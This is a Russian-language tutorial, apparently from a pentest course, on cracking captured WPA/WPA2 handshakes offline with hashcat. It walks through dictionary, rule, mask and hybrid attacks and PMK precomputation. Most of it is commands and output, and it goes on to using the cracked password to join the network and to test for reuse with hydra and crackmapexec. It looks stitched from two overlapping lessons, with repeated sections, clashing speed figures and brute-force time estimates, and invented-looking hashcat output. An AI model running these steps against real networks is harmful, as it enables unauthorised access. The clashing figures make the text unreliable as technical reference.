## Вопрос, с которого всё начинается

У тебя есть `office.hc22000` — материал рукопожатия. Ты запускаешь `hashcat` с rockyou, он молотит час и ничего не находит. Пароль просто длинный? Или мы выбрали неверную стратегию? Разберём, как hashcat ломает WPA и почему это дорого.

## Наш пример: один хеш WPA

```
$ cat office.hc22000
WPA*01*8a3f...c1*...*office
```

Это одна строка в формате `.hc22000`. Режим hashcat для WPA-PBKDF2-PMKID+EAPOL — **22000**.

## Шаг 1: почему WPA ломается медленно

Из прошлого урока мы знаем: `PMK = PBKDF2(пароль, SSID, 4096, 256)`. Каждый кандидат пароля требует 4096 итераций HMAC-SHA1 — это в тысячи раз дороже, чем MD5. Поэтому WPA-перебор идёт на порядки медленнее, чем, скажем, взлом NTLM.

```
$ hashcat -m 22000 office.hc22000 -b
...
Speed.#1.........:   231.7 kH/s
```

231 тысяча хешей в секунду — это «медленно» по меркам GPU: за час около 800 миллионов кандидатов. Значит, rockyou (14 млн) отработает за минуты, а 8-символьный полный перебор — за годы.

## Шаг 2: словарь как первый заход

Самый дешёвый шаг — проверить известные пароли:

```
$ hashcat -m 22000 office.hc22000 /usr/share/wordlists/rockyou.txt
...
8a3f...c1:Summer2023
Status...........: Cracked
```

`Summer2023` найден за минуты. Большинство реальных паролей — словарные или с сезонным числом.

## Шаг 3: правила расширяют словарь

Правила (`-r`) мутируют каждое слово словаря: добавляют цифру, меняют регистр, заменяют `a`→`@`. Одно правило `best64` превращает `password` в `Password1`, `p@ssword` и десятки других:

```
$ hashcat -m 22000 office.hc22000 rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

Так словарь на 14 млн слов даёт сотни миллионов кандидатов — всё ещё часы, но уже реалистично.

## Шаг 4: маски для целевого перебора

Если словарь не помог, а пароль похож на `Word####` (слово + 4 цифры), используем **маску** — шаблон позиций:

```
$ hashcat -m 22000 office.hc22000 -a 3 '?u?l?l?l?l?l?l?d?d?d?d'
```

`?u` — заглавная, `?l` — строчная, `?d` — цифра. Это 26·26^6·10^4 ≈ 3·10^13 кандидатов — на 230 kH/s это столетия. Поэтому маски применяют к **узким** шаблонам, а не ко всему алфавиту.

## Шаг 5: комбинируем и ускоряем

Практичная стратегия — не один прогон, а конвейер:

1. rockyou без правил (минуты).
2. rockyou с `best64` (часы).
3. Специфичные для объекта словари (название компании, города, годы).
4. Узкая маска под наблюдаемый паттерн.

Также помогает **несколько GPU** и `--optimized-kernel-enable`; можно ограничить алфавит, если из утечки известно, что пароль — буквы+цифры.

## Если не сработало

- Пароль ≥12 символов со смешанным алфавитом — перебор нереален, вектор закрыт.
- Точка использует **WPA3/SAE** — офлайн-материала нет, перебор неприменим.
- PMF + длинный пароль — комбинируйте с другими векторами (клиент, captive-portal).

## Что мы теперь знаем

- WPA ломается в режиме 22000, но медленно из-за PBKDF2.
- Порядок: словарь → словарь+правила → целевые словари → узкая маска.
- Маски дают огромные пространства; применять только к узким шаблонам.
- Длинный случайный пароль закрывает офлайн-вектор.

## Почему это офлайн-атака и что она меняет

Главное свойство взлома WPA2 — он **офлайн**. Мы не отправляем пароль точке и не получаем «да/нет»; мы один раз сняли дамп и теперь можем перебирать сколько угодно, сколько угодно быстро, без риска быть замеченным. Точка больше не участвует. Отсюда и экономика атаки: единственное узкое место — не скорость сети, а **скорость GPU** и **качество словаря**.

```
$ hashcat -m 22000 wpa.hc22000 -b
Hashmode: 22000 - WPA-PBKDF2-PMKID+EAPOL
Speed.#1.........:  1183.0 kH/s
```

Порядка миллиона кандидатов в секунду на одной игровой карте. Значит, словарь на 10 миллионов слов прогоняется за ~9 секунд, а полный перебор 8-значного цифрового пароля — часы. Пароль «Summer2023» в словаре найдётся мгновенно; случайный 12-символьный — практически никогда.

## Словари и правила: как не гонять rockyou «в лоб»

rockyou — базовый словарь из ~14 млн слитых паролей. Но гонять его «как есть» — прошлый век: люди добавляют к словам год, `!`, заглавную первую букву. Поэтому к базовому словарю применяют **правила** — наборы трансформаций.

```
$ hashcat -m 22000 wpa.hc22000 rockyou.txt -r rules/best64.rule
$ hashcat -m 22000 wpa.hc22000 rockyou.txt -r rules/OneRuleToRuleThemAll.rule
```

Правило `best64` даёт 64 варианта на слово (добавить цифру, `!`, сменить регистр), `OneRuleToRuleThemAll` — сотни. Комбинация «словарь × правила» часто находит пароль там, где чистый словарь молчит. Но помни: каждое правило умножает время; `best64` на 14 млн слов — это уже ~900 млн кандидатов.

## Маски: когда пароль структурный

Если ты знаешь **шаблон** пароля (например, «8 цифр» или «Слово+2 цифры»), эффективнее маски, а не словарь:

```
$ hashcat -m 22000 wpa.hc22000 -a 3 '?d?d?d?d?d?d?d?d'
$ hashcat -m 22000 wpa.hc22000 -a 3 '?u?l?l?l?l?l?d?d'
```

`?d` — цифра, `?l` — строчная, `?u` — заглавная, `?s` — символ. Маска `?d?d?d?d?d?d?d?d` перебирает ровно 10⁸ вариантов — минуты-часы на хорошей карте. Это работает, когда политика паролей предсказуема (например, корпоративный стандарт «месяц+год»).

## Ускорение: предвычисление PMK и GPU-ферма

Есть трюк, который даёт огромный прирост: PMK зависит только от **SSID и пароля**, но не от точки. Значит, для одного SSID можно один раз посчитать PMK для всего словаря и переиспользовать его для всех точек с тем же SSID.

```
$ hcxkeys -m 4096 -s office rockyou.txt -o office.pmk
$ hashcat -m 22000 wpa.hc22000 office.pmk
```

Если у тебя несколько дампов с одинаковым SSID (типичная ситуация у сети с десятком точек), предвычисление экономит 90% времени. Для больших словарей строят GPU-фермы на 8–16 карт — но это уже промышленный масштаб, а не одна команда.

## Полный прогон от дампа до пароля

Соберём всё вместе. У нас есть `wpa.cap` с рукопожатием точки `office`:

```
$ hcxpcapngtool -o wpa.hc22000 wpa.cap
$ wc -l wpa.hc22000
1 wpa.hc22000
```

Одна строка — одно рукопожатие. Сначала пробуем словарь с правилами:

```
$ hashcat -m 22000 wpa.hc22000 rockyou.txt -r rules/best64.rule --status
...
STATUS  Cracked
HASH:    4f2b...:aa:bb:cc:00:11:22:office
PASSWORD: Summer2023!
```

Пароль найден. Теперь его можно использовать: подключиться к сети, проверить, не переиспользован ли он в других сервисах (`hydra`, `crackmapexec`), и — главное — зафиксировать в отчёте, что **пароль переиспользован/слаб**.

## Если не сработало

- **Словарь не подошёл** → комбинируй словари (`-a 1`), добавь правила, или перейди к маске по шаблону.
- **PMKID вместо рукопожатия** → тот же `-m 22000`, формат совместим.
- **Пароль длинный и случайный** → офлайн-перебор бесполезен; переходи к атаке на WPS или Evil Twin.
- **Хочется быстрее** → предвычисли PMK под конкретный SSID.

## Что мы теперь знаем

- WPA2-перебор офлайн: точка не участвует, ограничение — GPU и словарь.
- Правила (`best64`, `OneRuleToRuleThemAll`) расширяют словарь трансформациями.
- Маски (`-a 3`) эффективны для структурных паролей.
- Предвычисление PMK по SSID многократно ускоряет работу.
- Найденный пароль надо сразу проверить на переиспользование.

## Прикидка времени перебора

Перед запуском полезно оценить, реально ли уложиться в разумное время. Формула простая: число кандидатов делим на скорость hashcat.

```
$ python3 -c "print(14_000_000*64/1_180_000, 'секунд')"
759 секунд
```

14 млн слов × правило best64 (64 варианта) ÷ 1.18 млн/с ≈ 760 секунд — около 13 минут. А полный перебор `?d?d?d?d?d?d?d?d` — 10⁸ кандидатов, это уже ~85 секунд на такой карте (маски идут быстрее правил). Такая прикидка спасает от запусков «на всю ночь» без результата.

## Частые грабли при переборе

- **Не тот hash-режим** → WPA2-рукопожатие и PMKID — оба `-m 22000`; `-m 2500` устарел.
- **Словарь без правил** → теряешь `Summer2023!`; всегда пробуй `-r best64`.
- **Дамп не сконвертирован** → hashcat молча даст 0 хешей; проверь `wc -l wpa.hc22000`.
- **Перегрев/троттлинг GPU** → скорость падает втрое; следи за температурой.
- **Пароль вне словаря** → не гоняй бесконечный перебор, переходи к другому вектору.

## Сравнение стратегий перебора

Разные цели требуют разных стратегий. Ниже — когда что выбирать.

| Стратегия | Команда | Когда применять |
|---|---|---|
| Словарь | `hashcat -m 22000 wpa.hc22000 rockyou.txt` | быстрая проверка на слитый пароль |
| Словарь + правила | `... rockyou.txt -r rules/best64.rule` | люди добавляют цифры/символы к словам |
| Комбинация | `... -a 1 left.txt right.txt` | пароль из двух слов (`Summer` + `2023`) |
| Маска | `... -a 3 '?u?l?l?l?l?l?d?d'` | известен шаблон (Слово+год) |
| Гибрид | `... -a 6 rockyou.txt ?d?d` | слово + две цифры |

Начинают всегда с простого словаря и правил: это дешевле всего и чаще всего закрывает задачу. Маски и гибриды — второй эшелон, когда структура пароля уже понятна из политики или из утечки.
